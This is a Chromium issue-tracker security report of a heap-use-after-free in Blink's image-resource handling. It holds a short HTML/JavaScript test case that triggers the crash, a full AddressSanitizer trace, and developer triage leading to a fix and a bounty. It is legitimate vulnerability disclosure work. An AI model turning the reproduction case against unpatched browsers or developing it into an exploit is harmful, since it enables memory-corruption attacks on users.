# Security: heap-use-after-free in blink::ImageResourceContent::UpdateImageAnimationPolicy

| Field | Value |
|-------|-------|
| **Issue ID** | [40093807](https://issues.chromium.org/issues/40093807) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Layout, Blink>Loader |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | wa...@chromium.org |
| **Created** | 2019-01-21 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell when loaded from an HTTP server. It requires the attached grid.png in the same directory.

**VERSION**  

Chrome Version: asan-linux-release-624586  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
function start() {
o184=document.createElementNS('http://www.w3.org/1999/xhtml','style');
o185=document.createTextNode(':first-line{ all: inherit');
o184.appendChild(o185);
document.documentElement.appendChild(o184);
document.documentElement['scrollTop']=-1265;
o355=document.createElementNS('http://www.w3.org/1999/xhtml','style');
o356=document.createTextNode('\\*{ background-image: url("grid.png")');
o355.appendChild(o356);
document.documentElement.appendChild(o355);
location.reload();
}
</script>
<body onload="start()"></body>
# FOR CRASHES Crash State:

==8356==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000562c0 at pc 0x55f9d10598f6 bp 0x7fffeb91e2d0 sp 0x7fffeb91e2c8  

READ of size 8 at 0x6120000562c0 thread T0 (content\_shell)  

#0 0x55f9d10598f5 in blink::ImageResourceContent::UpdateImageAnimationPolicy() third\_party/blink/renderer/core/loader/resource/image\_resource\_content.cc:554:19  

#1 0x55f9d170af32 in blink::StyleFetchedImage::ImageNotifyFinished(blink::ImageResourceContent\*) third\_party/blink/renderer/core/style/style\_fetched\_image.cc:137:13  

#2 0x55f9d1052da8 in blink::ImageResourceContent::AddObserver(blink::ImageResourceObserver\*) third\_party/blink/renderer/core/loader/resource/image\_resource\_content.cc:171:15  

#3 0x55f9d1709747 in blink::StyleFetchedImage::StyleFetchedImage(blink::Document const&, blink::FetchParameters&, bool) third\_party/blink/renderer/core/style/style\_fetched\_image.cc:46:11  

#4 0x55f9ce5b1f59 in blink::StyleFetchedImage\* blink::MakeGarbageCollected<blink::StyleFetchedImage, blink::Document const&, blink::FetchParameters&, bool&>(blink::Document const&, blink::FetchParameters&, bool&) third\_party/blink/renderer/platform/heap/heap.h:567:30  

#5 0x55f9ce5b0a94 in Create third\_party/blink/renderer/core/style/style\_fetched\_image.h:46:12  

#6 0x55f9ce5b0a94 in blink::CSSImageValue::CacheImage(blink::Document const&, blink::FetchParameters::ImageRequestOptimization, blink::CrossOriginAttributeValue) third\_party/blink/renderer/core/css/css\_image\_value.cc:89  

#7 0x55f9ceb62bb2 in blink::ElementStyleResources::LoadPendingImage(blink::ComputedStyle\*, blink::StylePendingImage\*, blink::FetchParameters::ImageRequestOptimization, blink::CrossOriginAttributeValue) third\_party/blink/renderer/core/css/resolver/element\_style\_resources.cc:152:25  

#8 0x55f9ceb647a1 in blink::ElementStyleResources::LoadPendingImages(blink::ComputedStyle\*) third\_party/blink/renderer/core/css/resolver/element\_style\_resources.cc:218:17  

#9 0x55f9ceb663a3 in blink::ElementStyleResources::LoadPendingResources(blink::ComputedStyle\*) third\_party/blink/renderer/core/css/resolver/element\_style\_resources.cc:332:3  

#10 0x55f9cebb920f in LoadPendingResources third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:656:36  

#11 0x55f9cebb920f in blink::StyleResolver::ApplyMatchedStandardProperties(blink::StyleResolverState&, blink::MatchResult const&, blink::StyleResolver::CacheSuccess const&, blink::StyleResolver::NeedsApplyPass&) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1890  

#12 0x55f9cebacffe in blink::StyleResolver::ApplyMatchedPropertiesAndCustomPropertyAnimations(blink::StyleResolverState&, blink::MatchResult const&, blink::Element const\*) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1650:5  

#13 0x55f9cebab055 in blink::StyleResolver::StyleForElement(blink::Element\*, blink::ComputedStyle const\*, blink::ComputedStyle const\*, blink::RuleMatchingBehavior) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:806:5  

#14 0x55f9cefb8c68 in OriginalStyleForLayoutObject third\_party/blink/renderer/core/dom/element.cc:2205:46  

#15 0x55f9cefb8c68 in blink::Element::StyleForLayoutObject(bool) third\_party/blink/renderer/core/dom/element.cc:2174  

#16 0x55f9cefbbc6d in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/element.cc:2379:17  

#17 0x55f9cefba0bc in blink::Element::RecalcStyle(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/element.cc:2288:16  

#18 0x55f9cece5899 in blink::StyleEngine::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/css/style\_engine.cc:1699:38  

#19 0x55f9cee3143e in blink::Document::UpdateStyle() third\_party/blink/renderer/core/dom/document.cc:2321:24  

#20 0x55f9cee223da in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2237:3  

#21 0x55f9cee41500 in blink::Document::ImplicitClose() third\_party/blink/renderer/core/dom/document.cc:3508:5  

#22 0x55f9cee426fd in blink::Document::CheckCompletedInternal() third\_party/blink/renderer/core/dom/document.cc:3583:5  

#23 0x55f9cee40edc in blink::Document::CheckCompleted() third\_party/blink/renderer/core/dom/document.cc:3559:7  

#24 0x55f9d0fc87f2 in blink::FrameLoader::FinishedParsing() third\_party/blink/renderer/core/loader/frame\_loader.cc:441:26  

#25 0x55f9cee6af30 in blink::Document::FinishedParsing() third\_party/blink/renderer/core/dom/document.cc:6180:21  

#26 0x55f9d0113143 in end third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:892:18  

#27 0x55f9d0113143 in blink::HTMLDocumentParser::AttemptToRunDeferredScriptsAndEnd() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:907  

#28 0x55f9d0119d8d in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc  

#29 0x55f9d0114c51 in blink::HTMLDocumentParser::PumpPendingSpeculations() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:593:9  

#30 0x55f9c4ca2c03 in Run base/callback.h:99:12  

#31 0x55f9c4ca2c03 in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) third\_party/blink/renderer/platform/scheduler/common/post\_cancellable\_task.cc:48  

#32 0x55f9c797b5fe in Run base/callback.h:99:12  

#33 0x55f9c797b5fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#34 0x55f9c7a7a15a in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:209:23  

#35 0x55f9c797b5fe in Run base/callback.h:99:12  

#36 0x55f9c797b5fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#37 0x55f9c79786b7 in base::MessageLoopImpl::RunTask(base::PendingTask\*) base/message\_loop/message\_loop\_impl.cc:352:46  

#38 0x55f9c7979d33 in DeferOrRunPendingTask base/message\_loop/message\_loop\_impl.cc:363:5  

#39 0x55f9c7979d33 in base::MessageLoopImpl::DoWork() base/message\_loop/message\_loop\_impl.cc:451  

#40 0x55f9c7980fbf in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:31  

#41 0x55f9c79f2662 in base::RunLoop::Run() base/run\_loop.cc:150:14  

#42 0x55f9d580e308 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:233:16  

#43 0x55f9c5097a00 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:503:14  

#44 0x55f9c509babc in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:871:10  

#45 0x55f9ccfe2fc7 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:461:29  

#46 0x55f9c242521c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#47 0x55f9bf6c1547 in main content/shell/app/shell\_main.cc:39:10  

#48 0x7fdd473a9b96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

0x6120000562c0 is located 0 bytes inside of 264-byte region [0x6120000562c0,0x6120000563c8)  

freed by thread T0 (content\_shell) here:  

#0 0x55f9bf691552 in \_\_interceptor\_free /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:124:3  

#1 0x55f9d0a6b285 in blink::LayoutObject::DestroyAndCleanupAnonymousWrappers() third\_party/blink/renderer/core/layout/layout\_object.cc  

#2 0x55f9cf0dff8a in blink::Node::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/node.cc:1427:24  

#3 0x55f9cefb7215 in blink::Element::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/element.cc:2135:18  

#4 0x55f9cedc85fd in blink::ContainerNode::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/container\_node.cc:1009:12  

#5 0x55f9cefb7215 in blink::Element::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/element.cc:2135:18  

#6 0x55f9cedc85fd in blink::ContainerNode::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/container\_node.cc:1009:12  

#7 0x55f9cee39599 in blink::Document::Shutdown() third\_party/blink/renderer/core/dom/document.cc:2892:18  

#8 0x55f9d0fd5411 in blink::FrameLoader::PrepareForCommit() third\_party/blink/renderer/core/loader/frame\_loader.cc:1256:28  

#9 0x55f9d0fd5a01 in blink::FrameLoader::CommitProvisionalLoad() third\_party/blink/renderer/core/loader/frame\_loader.cc:1280:8  

#10 0x55f9d0f8a59c in blink::DocumentLoader::CommitNavigation(WTF::AtomicString const&, blink::KURL const&) third\_party/blink/renderer/core/loader/document\_loader.cc:816:20  

#11 0x55f9d0f89995 in blink::DocumentLoader::CommitData(char const\*, unsigned long) third\_party/blink/renderer/core/loader/document\_loader.cc:868:3  

#12 0x55f9d0f91767 in blink::DocumentLoader::DataReceived(blink::Resource\*, char const\*, unsigned long) third\_party/blink/renderer/core/loader/document\_loader.cc:915:3  

#13 0x55f9c4b79b80 in blink::Resource::NotifyDataReceived(char const\*, unsigned long) third\_party/blink/renderer/platform/loader/fetch/resource.cc:243:8  

#14 0x55f9c4b79423 in blink::Resource::AppendData(char const\*, unsigned long) third\_party/blink/renderer/platform/loader/fetch/resource.cc:237:3  

#15 0x55f9c4c01af6 in blink::ResourceLoader::DidReceiveData(char const\*, int) third\_party/blink/renderer/platform/loader/fetch/resource\_loader.cc:972:14  

#16 0x55f9d4738be3 in content::WebURLLoaderImpl::Context::OnReceivedData(std::\_\_1::unique\_ptr<content::RequestPeer::ReceivedData, std::\_\_1::default\_delete[content::RequestPeer::ReceivedData](javascript:void(0);) >) content/renderer/loader/web\_url\_loader\_impl.cc:950:12  

#17 0x55f9d473a95a in content::WebURLLoaderImpl::RequestPeerImpl::OnReceivedData(std::\_\_1::unique\_ptr<content::RequestPeer::ReceivedData, std::\_\_1::default\_delete[content::RequestPeer::ReceivedData](javascript:void(0);) >) content/renderer/loader/web\_url\_loader\_impl.cc:1192:13  

#18 0x55f9d475a65b in content::URLResponseBodyConsumer::OnReadable(unsigned int) content/renderer/loader/url\_response\_body\_consumer.cc:149:25  

#19 0x55f9d47524c4 in content::URLLoaderClientImpl::FlushDeferredMessages() content/renderer/loader/url\_loader\_client\_impl.cc:231:21  

#20 0x55f9c797b5fe in Run base/callback.h:99:12  

#21 0x55f9c797b5fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#22 0x55f9c7a7a15a in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:209:23  

#23 0x55f9c797b5fe in Run base/callback.h:99:12  

#24 0x55f9c797b5fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#25 0x55f9c79786b7 in base::MessageLoopImpl::RunTask(base::PendingTask\*) base/message\_loop/message\_loop\_impl.cc:352:46  

#26 0x55f9c7979d33 in DeferOrRunPendingTask base/message\_loop/message\_loop\_impl.cc:363:5  

#27 0x55f9c7979d33 in base::MessageLoopImpl::DoWork() base/message\_loop/message\_loop\_impl.cc:451  

#28 0x55f9c7980fbf in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:31  

#29 0x55f9c79f2662 in base::RunLoop::Run() base/run\_loop.cc:150:14  

#30 0x55f9d580e308 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:233:16  

#31 0x55f9c5097a00 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:503:14  

#32 0x55f9c509babc in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:871:10

previously allocated by thread T0 (content\_shell) here:  

#0 0x55f9bf6918d3 in \_\_interceptor\_malloc /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:146:3  

#1 0x55f9d0a2d2e2 in AllocFlags base/allocator/partition\_allocator/partition\_alloc.h:274:18  

#2 0x55f9d0a2d2e2 in Alloc base/allocator/partition\_allocator/partition\_alloc.h:267  

#3 0x55f9d0a2d2e2 in blink::LayoutObject::operator new(unsigned long) third\_party/blink/renderer/core/layout/layout\_object.cc:201  

#4 0x55f9d0aae5d5 in blink::LayoutObjectFactory::CreateBlockFlow(blink::Node&, blink::ComputedStyle const&) third\_party/blink/renderer/core/layout/layout\_object\_factory.cc:57:10  

#5 0x55f9d0a2dc2d in blink::LayoutObject::CreateObject(blink::Element\*, blink::ComputedStyle const&) third\_party/blink/renderer/core/layout/layout\_object.cc:247:14  

#6 0x55f9cf081f54 in blink::LayoutTreeBuilderForElement::CreateLayoutObject() third\_party/blink/renderer/core/dom/layout\_tree\_builder.cc:142:44  

#7 0x55f9cefb288d in CreateLayoutObjectIfNeeded third\_party/blink/renderer/core/dom/layout\_tree\_builder.h:107:7  

#8 0x55f9cefb288d in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2044  

#9 0x55f9cedc8494 in blink::ContainerNode::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/container\_node.cc:999:14  

#10 0x55f9cefb3071 in blink::Element::AttachLayoutTree(blink::Node::AttachContext&) third\_party/blink/renderer/core/dom/element.cc:2077:18  

#11 0x55f9cefbe628 in blink::Element::RebuildLayoutTree(blink::WhitespaceAttacher&) third\_party/blink/renderer/core/dom/element.cc:2464:5  

#12 0x55f9cece5e17 in blink::StyleEngine::RebuildLayoutTree() third\_party/blink/renderer/core/css/style\_engine.cc:1724:18  

#13 0x55f9cee31633 in blink::Document::UpdateStyle() third\_party/blink/renderer/core/dom/document.cc:2331:24  

#14 0x55f9cee223da in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2237:3  

#15 0x55f9cee6adc1 in blink::Document::FinishedParsing() third\_party/blink/renderer/core/dom/document.cc:6176:7  

#16 0x55f9d0113143 in end third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:892:18  

#17 0x55f9d0113143 in blink::HTMLDocumentParser::AttemptToRunDeferredScriptsAndEnd() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:907  

#18 0x55f9d0119d8d in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc  

#19 0x55f9d0114c51 in blink::HTMLDocumentParser::PumpPendingSpeculations() third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:593:9  

#20 0x55f9c4ca2c03 in Run base/callback.h:99:12  

#21 0x55f9c4ca2c03 in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) third\_party/blink/renderer/platform/scheduler/common/post\_cancellable\_task.cc:48  

#22 0x55f9c797b5fe in Run base/callback.h:99:12  

#23 0x55f9c797b5fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#24 0x55f9c7a7a15a in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:209:23  

#25 0x55f9c797b5fe in Run base/callback.h:99:12  

#26 0x55f9c797b5fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#27 0x55f9c79786b7 in base::MessageLoopImpl::RunTask(base::PendingTask\*) base/message\_loop/message\_loop\_impl.cc:352:46  

#28 0x55f9c7979d33 in DeferOrRunPendingTask base/message\_loop/message\_loop\_impl.cc:363:5  

#29 0x55f9c7979d33 in base::MessageLoopImpl::DoWork() base/message\_loop/message\_loop\_impl.cc:451  

#30 0x55f9c7980fbf in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:31  

#31 0x55f9c79f2662 in base::RunLoop::Run() base/run\_loop.cc:150:14  

#32 0x55f9d580e308 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:233:16  

#33 0x55f9c5097a00 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:503:14  

#34 0x55f9c509babc in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:871:10  

#35 0x55f9ccfe2fc7 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:461:29  

#36 0x55f9c242521c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#37 0x55f9bf6c1547 in main content/shell/app/shell\_main.cc:39:10

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/blink/renderer/core/loader/resource/image\_resource\_content.cc:554:19 in blink::ImageResourceContent::UpdateImageAnimationPolicy()  

Shadow bytes around the buggy address:  

0x0c2480002c00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c2480002c10: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa  

0x0c2480002c20: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c2480002c30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c2480002c40: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa  

=>0x0c2480002c50: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd  

0x0c2480002c60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c2480002c70: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa  

0x0c2480002c80: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c2480002c90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c2480002ca0: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==8356==ABORTING

## Attachments

- [grid.png](attachments/grid.png) (image/png, 255 B)

## Timeline

### cl...@chromium.org (2019-01-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4797150324195328.

### cl...@chromium.org (2019-01-22)

Testcase 4797150324195328 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=4797150324195328.

### cl...@chromium.org (2019-01-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5423522214182912.

### li...@chromium.org (2019-01-22)

Re-routing to japhet@ for triage--could you please take a look? I'm having trouble reproducing this bug. Thanks!

[Monorail components: Blink>Loader]

### cl...@chromium.org (2019-01-22)

Testcase 5423522214182912 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5423522214182912.

### sh...@chromium.org (2019-01-23)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-01-23)

[Empty comment from Monorail migration]

### ja...@chromium.org (2019-01-24)

This looks like a LayoutObject is being deleted without properly unregistering itself from an ImageResourceContents it is observing.

I was going to guess pdr@ as an owner, but he's apparently OOO? chrishtr@, would you mind suggesting a good owner for this?

[Monorail components: Blink>Layout]

### ch...@chromium.org (2019-01-24)

[Empty comment from Monorail migration]

### ch...@chromium.org (2019-01-24)

[Empty comment from Monorail migration]

### [Deleted User] (2019-01-28)

cloudfuzzer@, I am unable to duplicate this locally. I'm running a locally-built linux64 ASAN build from rev 624586 code. Are there any command line flags necessary to reproduce this? Here is my args.gn - do you see anything different here? How long does the reload loop need to run before it crashes? Once? Or a whole bunch of times?

use_goma = true
dcheck_always_on = true
is_component_build = true
enable_nacl = false
is_asan = true
is_debug = false
v8_enable_verify_heap = true

I also tried with these changed:
dcheck_always_on = false
is_component_build = false

Anything you can help with would be good. We could try a speculative fix, but without a way to repro this, we won't know if it worked.

### [Deleted User] (2019-01-29)

While waiting for feedback, I can't help but notice this series of CLs, which are touching the LayoutObject::UpdateImageObservers() function and the calls to it. Is it possible something in here is the cause of this issue?

https://chromium-review.googlesource.com/c/chromium/src/+/1396154
https://chromium-review.googlesource.com/c/chromium/src/+/1403315
https://chromium-review.googlesource.com/c/chromium/src/+/1403316
https://chromium-review.googlesource.com/c/chromium/src/+/1407974
https://chromium-review.googlesource.com/c/chromium/src/+/1408358
https://chromium-review.googlesource.com/c/chromium/src/+/1411534

wangxianzhu@, what do you think?

### [Deleted User] (2019-01-29)

...plus the final one, I left that off:

https://chromium-review.googlesource.com/c/chromium/src/+/1411595

### wa...@chromium.org (2019-01-29)

Based on the test case, I believe this is caused by my first-line background-image CL, and I think it has been fixed in crbug.com/924457.

### cl...@chromium.org (2019-01-29)

Testcase 4797150324195328 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=4797150324195328.

### [Deleted User] (2019-01-29)

Great, thanks wangxianzhu. I was unable to duplicate this on the reported revision (before your fix) so there's no way to know if crbug.com/924457 is the same issue.

Let's give the reporter time to add additional info, and then close if not.

### cl...@gmail.com (2019-01-29)

Hey, I can confirm that this doesn't reproduce anymore for asan-linux-release-626940.
I am not sure why it failed for your build of 624586. I get my builds from 

https://commondatastorage.googleapis.com/chromium-browser-asan/index.html?prefix=linux-release/



### wa...@chromium.org (2019-01-29)

Thanks cloudfuzzer@gmail.com for verification.

### sh...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### na...@google.com (2019-02-04)

[Empty comment from Monorail migration]

### na...@google.com (2019-02-07)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-02-07)

Congrats! The Panel has decided to reward $3000 for this report :) 

### na...@google.com (2019-02-07)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mm...@chromium.org (2019-05-13)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-05-17)

[Empty comment from Monorail migration]

### is...@google.com (2019-05-17)

This issue was migrated from crbug.com/chromium/923951?no_tracker_redirect=1

[Multiple monorail components: Blink>Layout, Blink>Loader]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093807)*
